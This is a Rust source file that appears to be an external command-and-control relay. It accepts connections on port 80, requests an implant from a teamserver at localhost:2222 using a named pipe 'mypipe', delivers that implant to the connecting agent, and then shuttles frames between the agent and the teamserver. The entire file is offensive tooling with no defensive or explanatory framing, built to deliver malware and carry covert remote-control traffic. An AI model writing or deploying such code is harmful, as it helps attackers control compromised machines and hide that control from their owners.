use covert_server::start_implant_session;
use covert_server::CSFrame;
use tokio::{
    io::AsyncWriteExt,
    net::{TcpListener, TcpStream},
    task, try_join,
};

#[tokio::main]
async fn main() {
    if let Err(e) = try_join!(agent_server_task()) {
        println!("{}", e);
    };
}

async fn agent_server_task() -> Result<(), Box<dyn std::error::Error>> {
    let listener = TcpListener::bind("0.0.0.0:80").await?;
    loop {
        let (stream, _) = listener.accept().await?;
        task::spawn(async {
            if let Err(e) = handle_agent_connection(stream).await {
                println!("{}", e);
            };
        });
    }
}

async fn handle_agent_connection(
    mut agent_conn: TcpStream,
) -> Result<(), Box<dyn std::error::Error>> {
    let (implant, mut ts_conn) =
        start_implant_session("localhost:2222", "x64", "mypipe").await?;
    agent_conn.write_frame(&implant).await;
    loop {
        let data_from_agent = agent_conn.read_frame().await?;
        ts_conn.write_frame(&data_from_agent).await;
        let data_from_ts = ts_conn.read_frame().await?;
        agent_conn.write_frame(&data_from_ts);
    }
}
